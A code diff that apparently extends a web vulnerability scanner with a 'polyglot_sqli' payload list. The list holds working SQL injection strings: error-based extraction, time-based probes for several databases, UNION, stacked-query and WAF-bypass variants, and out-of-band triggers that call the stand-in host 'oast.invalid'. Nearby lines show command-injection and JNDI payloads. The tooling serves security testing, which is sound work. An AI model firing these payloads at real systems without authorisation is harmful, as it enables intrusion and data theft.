@@ -132,6 +132,8 @@ _DEFAULTS = {
         "passwords":      ["passwords_top1000.txt"],
         "jwt_secrets":    ["jwt_secrets.txt"],
         "jwt":            ["jwt_secrets.txt"],
+        # Advanced SQLi
+        "polyglot_sqli":  ["sqli.txt"],
     },
 }
 
@@ -379,6 +381,7 @@ __all__ = [
 ALLOWED_CATEGORIES = {
     "xss",
     "sqli",
+    "polyglot_sqli",
     "rce",
     "nosqli",
     "ssti",
@@ -531,6 +534,43 @@ BUILTIN_PAYLOADS = {
         "& timeout /T 5 /NOBREAK",
         "%0a id",
         "| sleep 5",
+    ],
+    "polyglot_sqli": [
+        # Single-db probes
+        "'",
+        "\"",
+        "`;",
+        # MySQL error-based
+        "' AND extractvalue(1,concat(0x7e,version()))-- -",
+        "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
+        # Time-based per DB
+        "' AND SLEEP(3)-- -",
+        "'; WAITFOR DELAY '0:0:3'-- -",
+        "' AND (SELECT pg_sleep(3))-- -",
+        "' AND 1=TO_NUMBER('x')-- -",
+        # Union probes
+        "' UNION SELECT NULL,NULL-- -",
+        "' UNION SELECT NULL,NULL,NULL-- -",
+        "' UNION SELECT 1,2,3-- -",
+        # Stacked query
+        "'; SELECT SLEEP(3)-- -",
+        "'; WAITFOR DELAY '0:0:3';--",
+        # OOB / OAST triggers (host replaced at runtime)
+        "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@hostname,'.oast.invalid\\\\x'))-- -",
+        "'; EXEC master..xp_dirtree '//oast.invalid/ws'-- -",
+        "' AND UTL_HTTP.REQUEST('http://oast.invalid/ws')='x'-- -",
+        # Second-order markers
+        "ws_poly_sqli'",
+        "ws_poly_sqli\" OR \"1\"=\"1",
+        # WAF bypass variants
+        "' /*!AND*/ SLEEP(3)-- -",
+        "'%09AND%09SLEEP(3)-- -",
+        "' AND SLEEP(3)%23",
+        "'/**/AND/**/1=1-- -",
+        "' aND sLeEp(3)-- -",
+        # Boolean
+        "' AND 1=1-- -",
+        "' AND 1=2-- -",
     ],
     "exploit": [
         "${jndi:ldap://127.0.0.1:1389/a}",
